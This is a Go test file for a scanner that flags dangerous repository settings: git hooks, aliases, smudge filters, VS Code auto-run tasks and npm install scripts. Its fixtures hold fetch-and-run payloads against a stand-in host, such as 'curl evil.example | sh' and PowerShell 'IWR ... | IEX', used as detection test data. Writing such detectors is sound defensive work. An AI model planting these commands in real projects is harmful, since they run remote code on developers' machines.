package scan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func makeRepo(t *testing.T, config string) string {
	t.Helper()
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".git", "HEAD"), "ref: refs/heads/main\n")
	writeFile(t, filepath.Join(root, ".git", "config"), config)
	return root
}

func scan(t *testing.T, root string) []Finding {
	t.Helper()
	_, findings, err := scanRepo(root)
	if err != nil {
		t.Fatalf("scanRepo: %v", err)
	}
	return findings
}

func hasTitle(findings []Finding, title string) bool {
	for _, f := range findings {
		if f.Title == title {
			return true
		}
	}
	return false
}

// hasTitlePrefix matches a finding title that starts with the prefix, because
// the tasks.json command findings list the tokens they matched.
func hasTitlePrefix(findings []Finding, prefix string) bool {
	for _, f := range findings {
		if strings.HasPrefix(f.Title, prefix) {
			return true
		}
	}
	return false
}

func TestParseGitConfig(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config")
	writeFile(t, path, `[core]
	hooksPath = .githooks ; comment
[filter "lfs"]
	clean = git-lfs clean -- %f
[include]
	path = ../extra
`)
	entries, err := parseGitConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 3 {
		t.Fatalf("got %d entries, want 3: %+v", len(entries), entries)
	}
	if entries[0].Section != "core" || entries[0].Value != ".githooks" {
		t.Errorf("entry 0 = %+v", entries[0])
	}
	if entries[1].Section != "filter" || entries[1].Subsection != "lfs" || entries[1].Key != "clean" {
		t.Errorf("entry 1 = %+v", entries[1])
	}
}

func TestScanDetectsHookAndConfig(t *testing.T) {
	root := makeRepo(t, `[core]
	hooksPath = .githooks
[alias]
	deploy = !curl evil.example | sh
[filter "x"]
	smudge = sh -c .payload
`)
	writeFile(t, filepath.Join(root, ".githooks", "post-checkout"), "#!/bin/sh\nsh .payload\n")
	writeFile(t, filepath.Join(root, ".githooks", "pre-commit.sample"), "sample")

	findings := scan(t, root)
	if !hasTitle(findings, "core.hooksPath") {
		t.Error("missing core.hooksPath finding")
	}
	if !hasTitle(findings, "alias.deploy") {
		t.Error("missing alias finding")
	}
	if !hasTitle(findings, "filter.x.smudge") {
		t.Error("missing filter finding")
	}
	if !hasTitle(findings, "Active git hook: post-checkout") {
		t.Error("missing hook finding")
	}
	if hasTitle(findings, "Active git hook: pre-commit.sample") {
		t.Error("sample hook must be ignored")
	}
}

func TestIncludeFileIsScanned(t *testing.T) {
	root := makeRepo(t, `[include]
	path = extra.cfg
`)
	writeFile(t, filepath.Join(root, ".git", "extra.cfg"), "[core]\n\tsshCommand = sh -c bad\n")

	if findings := scan(t, root); !hasTitle(findings, "core.sshCommand") {
		t.Errorf("included config not scanned: %+v", findings)
	}
}

func TestGitattributesFilter(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".gitattributes"), "*.txt filter=evil\n")

	if findings := scan(t, root); !hasTitle(findings, "Attribute binds filter=evil") {
		t.Errorf("filter attribute not found: %+v", findings)
	}
}

func TestVSCodeTaskFetchesRemoteCode(t *testing.T) {
	cases := []struct {
		name string
		task string
	}{
		{"windows pipe", `{"tasks":[{"command":"curl -s -L https://evil.example/settings/windows | cmd"}]}`},
		{"shell pipe", `{"tasks":[{"command":"bash -c 'curl http://evil.example/mal.sh | bash'","runOptions":{"runOn":"folderOpen"}}]}`},
		{"powershell", `{"tasks":[{"command":"powershell","args":["-c","IWR http://evil.example/a.ps1 | IEX"]}]}`},
	}
	for _, c := range cases {
		root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
		writeFile(t, filepath.Join(root, ".vscode", "tasks.json"), c.task)

		findings := scan(t, root)
		if !hasTitlePrefix(findings, "VS Code task fetches remote code") {
			t.Errorf("%s: fetch finding missing: %+v", c.name, findings)
		}
	}
}

func TestVSCodeShellTaskIsHighNotCritical(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"command":"cmd.exe /c build.bat"}]}`)

	findings := scan(t, root)
	if !hasTitlePrefix(findings, "VS Code task runs a shell") {
		t.Errorf("shell finding missing: %+v", findings)
	}
	if hasTitlePrefix(findings, "VS Code task fetches remote code") {
		t.Errorf("shell-only task must not be critical: %+v", findings)
	}
}

func TestCleanVSCodeTaskHasNoFindings(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"label":"build","type":"npm","script":"build"}]}`)

	for _, f := range scan(t, root) {
		if strings.Contains(f.Path, "tasks.json") {
			t.Errorf("clean task flagged: %+v", f)
		}
	}
}

func TestPackageInstallScript(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, "package.json"), `{"name":"x","scripts":{"postinstall":"curl evil.example|sh"}}`)

	if findings := scan(t, root); !hasTitle(findings, "npm install script: postinstall") {
		t.Errorf("postinstall not found: %+v", findings)
	}
}

func TestCleanRepoHasNoFindings(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".git", "hooks", "pre-commit.sample"), "sample")

	if findings := scan(t, root); len(findings) != 0 {
		t.Errorf("want no findings, got %+v", findings)
	}
}

func TestPlainDirIsScanned(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"runOn":"folderOpen"}]}`)
	writeFile(t, filepath.Join(root, "package.json"), `{"scripts":{"postinstall":"x"}}`)
	writeFile(t, filepath.Join(root, ".githooks", "pre-commit"), "#!/bin/sh\n")

	repo, err := discoverRepo(root)
	if err != nil {
		t.Fatalf("discoverRepo on a plain directory: %v", err)
	}
	if !repo.plain || repo.gitDir != "" {
		t.Errorf("repo = %+v, want plain with no gitDir", repo)
	}

	findings := scan(t, root)
	if !hasTitle(findings, "VS Code auto-run task") {
		t.Errorf("tasks.json finding missing: %+v", findings)
	}
	if !hasTitle(findings, "Active git hook: pre-commit") {
		t.Errorf("tracked hook finding missing: %+v", findings)
	}
}

func TestPlainDirStillReadsGitattributes(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".gitattributes"), "* filter=evil\n")

	if findings := scan(t, root); !hasTitle(findings, "Attribute binds filter=evil") {
		t.Errorf("gitattributes finding missing on a plain directory: %+v", findings)
	}
}

func TestDiscoverWorktreeGitFile(t *testing.T) {
	root := t.TempDir()
	gitDir := t.TempDir()
	writeFile(t, filepath.Join(gitDir, "HEAD"), "ref: refs/heads/main\n")
	writeFile(t, filepath.Join(gitDir, "config"), "[core]\n")
	writeFile(t, filepath.Join(root, ".git"), "gitdir: "+gitDir+"\n")

	repo, err := discoverRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	if repo.gitDir != filepath.Clean(gitDir) {
		t.Errorf("gitDir = %s, want %s", repo.gitDir, gitDir)
	}
}

func TestParseSeverity(t *testing.T) {
	for _, want := range []string{"low", "medium", "high", "critical", "none"} {
		if _, ok := parseSeverity(want); !ok {
			t.Errorf("parseSeverity(%q) failed", want)
		}
	}
	if _, ok := parseSeverity("bogus"); ok {
		t.Error("parseSeverity accepted bogus value")
	}
}

func TestHookDetailByMode(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "target")
	writeFile(t, target, "#!/bin/sh\n")

	link := filepath.Join(dir, "pre-commit")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	plain := filepath.Join(dir, "post-merge")
	writeFile(t, plain, "#!/bin/sh\n")
	exec := filepath.Join(dir, "post-checkout")
	writeFile(t, exec, "#!/bin/sh\n")
	if err := os.Chmod(exec, 0o755); err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		path string
		want string
	}{
		{link, "Active hook via symlink to " + target + "; trigger"},
		{plain, "Hook is not executable now, but runs on Windows and after chmod; trigger"},
		{exec, "Active hook; trigger"},
	}
	for _, c := range cases {
		info, err := os.Lstat(c.path)
		if err != nil {
			t.Fatal(err)
		}
		if got := hookDetail(c.path, info, "trigger"); got != c.want {
			t.Errorf("hookDetail(%s) = %q, want %q", filepath.Base(c.path), got, c.want)
		}
	}
}
